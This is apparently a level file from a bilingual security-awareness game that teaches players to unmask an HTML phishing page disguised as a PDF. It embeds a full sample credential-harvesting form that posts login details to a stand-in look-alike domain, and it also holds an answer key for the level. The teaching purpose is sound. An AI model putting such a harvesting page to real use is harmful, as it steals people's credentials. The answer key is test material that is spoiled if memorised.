import type { LevelConfig } from '../../engine/schema';
import { ACT2, INBOX, PHISH } from './story';

const DL = `${ACT2.home}/Downloads`;

/** The "certificate": a credential-harvesting page saved with a .pdf name. */
const KIT = `<!DOCTYPE html>
<!-- kit v2.3 | ops: km -->
<html>
<head><title>Helix Dynamics - Sign in</title></head>
<body>
  <h2>Helix Dynamics Single Sign-On</h2>
  <p>Your VPN certificate has expired. Sign in to download the renewed certificate.</p>
  <form action="${ACT2.collect}" method="POST">
    <input name="user" placeholder="Username">
    <input name="pass" type="password" placeholder="Password">
    <button>Renew certificate</button>
  </form>
  <script>document.forms[0].user.value = "${ACT2.user}";</script>
</body>
</html>
`;

const level: LevelConfig = {
  id: 'L08',
  requires: { levels: ['L07'], evidence: ['ev.l07.domains'] },
  briefing: {
    en: 'The phishing email also carried a "certificate". Samir saved everything to Downloads. A file name is just a label anyone can type; the bytes inside decide what a file really is. Check every download in the terminal before you trust its name.',
    ar: 'رسالة التصيّد حملت معها «شهادة» أيضاً. سمير حفظ كل شيء في مجلد التنزيلات. اسم الملف مجرد ملصق يستطيع أي شخص كتابته، أما البايتات التي بداخله فهي التي تحدد نوعه الحقيقي. افحص كل ملف منزَّل في الطرفية قبل أن تصدّق اسمه.',
  },
  mission: {
    goal: {
      en: 'Check what the files in Samir\'s Downloads really are, and find where the fake "certificate" sends a password.',
      ar: 'افحص النوع الحقيقي للملفات في مجلد التنزيلات عند سمير، واعرف إلى أين ترسل «الشهادة» المزيّفة كلمة المرور.',
    },
    investigate: [
      {
        en: 'The folder `~/Downloads` in the terminal. Two files there end in `.pdf`.',
        ar: 'المجلد `~/Downloads` في الطرفية. فيه ملفان ينتهي اسمهما بالامتداد `.pdf`.',
      },
      {
        en: 'The `file` command. It reads the first bytes of a file instead of trusting its name.',
        ar: 'الأمر `file`: يقرأ البايتات الأولى من الملف بدل أن يصدّق اسمه.',
      },
      {
        en: 'Inside the fake PDF: the `<form>` tag and the address in its `action`.',
        ar: 'داخل ملف PDF المزيّف: الوسم `<form>` والعنوان المكتوب في الخاصية `action`.',
      },
    ],
    success: {
      en: 'You have named the file that lies about its type and the address that collects passwords, and chosen the right reaction.',
      ar: 'تكون قد حدّدت الملف الذي يكذب في نوعه، والعنوان الذي يجمع كلمات المرور، واخترت التصرف الصحيح.',
    },
  },
  apps: ['case', 'mail', 'terminal', 'files', 'evidence'],
  autoOpen: ['case', 'terminal'],
  world: {
    user: ACT2.user,
    host: ACT2.host,
    home: ACT2.home,
    cwd: DL,
    now: ACT2.now,
    emails: [PHISH, ...INBOX],
    files: {
      [`${DL}/${ACT2.attachment}`]: { content: KIT, mtime: '2026-03-12T22:44:00Z' },
      [`${DL}/Backup-Report-2026-02.pdf`]: { content: '%PDF-1.7\n%\xe2\xe3\xcf\xd3\n1 0 obj\n<< /Type /Catalog /Pages 2 0 R >>\nendobj\n', mtime: '2026-03-11T07:05:00Z' },
      [`${DL}/helix-vpn-client.deb`]: { content: '!<arch>\ndebian-binary   1710000000  0     0     100644  4         `\n2.0\n', mtime: '2026-02-20T10:00:00Z' },
      [`${DL}/team-offsite.jpg`]: { content: '\xff\xd8\xff\xe0\x00\x10JFIF\x00\x01\x01\x00\x00\x01', mtime: '2026-01-30T18:00:00Z' },
      [`${DL}/notes.txt`]: { content: 'cert renewal -> ask IT? they said it was automatic\n', mtime: '2026-03-12T22:50:00Z' },
    },
  },
  objectives: [
    {
      id: 'inspect',
      prompt: {
        en: 'In the terminal, check what the files in `~/Downloads` REALLY are, by content instead of name.',
        ar: 'في الطرفية، افحص النوع الحقيقي لملفات `~/Downloads` حسب محتواها لا حسب اسمها.',
      },
      validator: { kind: 'command', pattern: '^file\\s+\\S' },
    },
    {
      id: 'liar',
      prompt: { en: 'Which download claims to be a PDF but is not?', ar: 'أي ملف منزَّل يدّعي أنه PDF وهو ليس كذلك؟' },
      placeholder: 'file name',
      validator: { kind: 'answer', accept: [ACT2.attachment, `${DL}/${ACT2.attachment}`, `~/Downloads/${ACT2.attachment}`] },
      wrong: {
        en: 'Both .pdf files have the same extension. Only one starts with %PDF: compare what `file` says for each.',
        ar: 'للملفين الامتداد نفسه `.pdf`، لكن واحداً منهما فقط يبدأ بالرمز `%PDF`. قارن ما يقوله الأمر `file` عن كل منهما.',
      },
    },
    {
      id: 'collect',
      prompt: {
        en: 'Read it (`cat`). Where does it send the username and password you type?',
        ar: 'اقرأ الملف بالأمر `cat`. إلى أي عنوان يرسل اسم المستخدم وكلمة المرور اللذين تكتبهما؟',
      },
      placeholder: 'https://…',
      validator: { kind: 'answer', accept: [ACT2.collect, ACT2.collect.replace('https://', '')] },
      wrong: {
        en: 'Look for the <form> tag: its action attribute is where the data goes.',
        ar: 'ابحث عن الوسم `<form>`: الخاصية `action` فيه هي المكان الذي تذهب إليه البيانات.',
      },
      grants: [
        {
          id: 'ev.l08.kit',
          title: { en: 'Credential-harvesting attachment', ar: 'مرفق لسرقة بيانات الدخول' },
          type: 'file',
          content: `${ACT2.attachment} = HTML login form posting to ${ACT2.collect}`,
          links: ['ev.l07.domains'],
        },
      ],
    },
    {
      id: 'response',
      prompt: { en: 'What should Samir have done with this attachment?', ar: 'ماذا كان على سمير أن يفعل بهذا المرفق؟' },
      validator: {
        kind: 'choice',
        correct: 'report',
        options: [
          { id: 'browser', label: { en: 'Open it in a different browser to be safe', ar: 'يفتحه في متصفح آخر ليكون آمناً' } },
          { id: 'forward', label: { en: 'Forward it to colleagues to ask if it looks real', ar: 'يرسله إلى زملائه ليسألهم هل يبدو حقيقياً' } },
          { id: 'report', label: { en: 'Report it to security without opening it', ar: 'يبلّغ فريق الأمن عنه دون أن يفتحه' } },
          { id: 'reply', label: { en: 'Reply to the sender and ask if it is legitimate', ar: 'يرد على المرسِل ويسأله هل الرسالة حقيقية' } },
        ],
      },
      wrong: {
        en: 'Opening, forwarding and replying all help the attacker. Reply-To goes to the look-alike domain.',
        ar: 'الفتح والتحويل والرد كلها تساعد المهاجم. والترويسة `Reply-To` تذهب إلى النطاق المزيّف.',
      },
    },
  ],
  guide: {
    nudge: {
      en: '`man file`. The file command reads the first bytes (the "magic") instead of trusting the extension.',
      ar: 'راجع `man file`. الأمر `file` يقرأ البايتات الأولى من الملف (توقيعه) بدل أن يصدّق الامتداد.',
    },
    clue: {
      en: 'Run `file *` inside `~/Downloads`. One `.pdf` file is reported as HTML.',
      ar: 'شغّل `file *` داخل `~/Downloads`. أحد ملفات `.pdf` يظهر على أنه HTML.',
    },
    steps: {
      inspect: {
        en: 'You are already in `~/Downloads`. Type `file *` to check every file by its content.',
        ar: 'أنت الآن داخل `~/Downloads`. اكتب `file *` لفحص كل ملف حسب محتواه.',
      },
      liar: {
        en: 'Compare the two `.pdf` lines. `Backup-Report-2026-02.pdf` is a real PDF document. `VPN-Certificate-Renewal.pdf` is reported as an HTML document. Type `VPN-Certificate-Renewal.pdf`.',
        ar: 'قارن سطرَي الملفين اللذين ينتهيان بالامتداد `.pdf`. الملف `Backup-Report-2026-02.pdf` مستند PDF حقيقي. أما `VPN-Certificate-Renewal.pdf` فيظهر على أنه مستند HTML. اكتب `VPN-Certificate-Renewal.pdf`.',
      },
      collect: {
        en: 'Run `cat VPN-Certificate-Renewal.pdf` and find the line that starts with `<form action=`. The address inside `action` is where the typed name and password go: `https://helixdynamlcs.example/collect.php`.',
        ar: 'شغّل `cat VPN-Certificate-Renewal.pdf` وابحث عن السطر الذي يبدأ بالنص `<form action=`. العنوان المكتوب في `action` هو المكان الذي يذهب إليه الاسم وكلمة المرور: `https://helixdynamlcs.example/collect.php`.',
      },
      response: {
        en: 'Choose "Report it to security without opening it". Opening it, forwarding it and replying to it all help the attacker.',
        ar: 'اختر «يبلّغ فريق الأمن عنه دون أن يفتحه». فتح المرفق وتحويله والرد عليه كلها تساعد المهاجم.',
      },
    },
    concept: {
      en: 'A file name and its extension are only a label. The first bytes of a file show what it really is, and the `file` command reads them for you. An HTML file dressed as a PDF opens a fake login page that sends your password to the attacker.',
      ar: 'اسم الملف وامتداده مجرد ملصق. البايتات الأولى في الملف تبيّن نوعه الحقيقي، والأمر `file` يقرؤها لك. ملف HTML المتنكّر في شكل PDF يفتح صفحة دخول مزيّفة ترسل كلمة مرورك إلى المهاجم.',
    },
  },
  intel: {
    id: 'intel.l08.signature',
    text: {
      en: 'The kit carries a signature comment: "ops: km". Keep it in mind.',
      ar: 'في أعلى ملف التصيّد تعليق يشبه التوقيع: `ops: km`. تذكّره جيداً.',
    },
  },
  rewards: { points: 140 },
  debrief: {
    concept: {
      en: 'Operating systems pick an app by extension, but the extension is part of the name and proves nothing. Real formats start with "magic bytes": %PDF for PDF, \\x89PNG for PNG, MZ for Windows programs. HTML attachments are a favorite phishing trick: they open in the browser, look like a real login page, and post whatever you type to the attacker, without any link for filters to scan.',
      ar: 'أنظمة التشغيل تختار التطبيق حسب الامتداد، لكن الامتداد جزء من الاسم ولا يثبت شيئاً. الصيغ الحقيقية تبدأ ببايتات مميِّزة: `%PDF` لملفات PDF، و`\\x89PNG` لصور PNG، و`MZ` لبرامج ويندوز. مرفقات HTML حيلة مفضّلة في التصيّد: تُفتح في المتصفح، وتبدو كصفحة دخول حقيقية، وترسل كل ما تكتبه إلى المهاجم، دون أي رابط تستطيع أنظمة الفحص تحليله.',
    },
    realTools: ['file', 'TrID', 'VirusTotal (hash lookup)', 'mail gateway attachment filtering'],
    takeaway: {
      en: 'Trust content, not names. Block or quarantine HTML attachments at the mail gateway.',
      ar: 'صدّق المحتوى لا الأسماء. واحظر مرفقات HTML أو اعزلها عند بوابة البريد.',
    },
    source: 'MITRE ATT&CK T1566.001 (Spearphishing Attachment); file(1) magic database',
  },
  echo: {
    intro: {
      en: 'A certificate that needs your password is not a certificate. Let the bytes tell you what it is.',
      ar: 'شهادة تطلب كلمة مرورك ليست شهادة. دع البايتات تخبرك ما هي.',
    },
    success: {
      en: 'A login page in a PDF costume. Whatever Samir typed went straight to helixdynamlcs.example.',
      ar: 'صفحة دخول متنكّرة في شكل ملف PDF. كل ما كتبه سمير ذهب مباشرة إلى `helixdynamlcs.example`.',
    },
  },
  solution: 'cd ~/Downloads (already cwd); file * -> VPN-Certificate-Renewal.pdf: HTML document. cat it -> form action https://helixdynamlcs.example/collect.php. Choice: report.',
  selfTest: [
    { run: 'file *', includes: `${ACT2.attachment}: HTML document` },
    { run: 'file Backup-Report-2026-02.pdf', includes: 'PDF document' },
    { run: `cat ${ACT2.attachment}`, includes: ACT2.collect },
  ],
};

export default level;
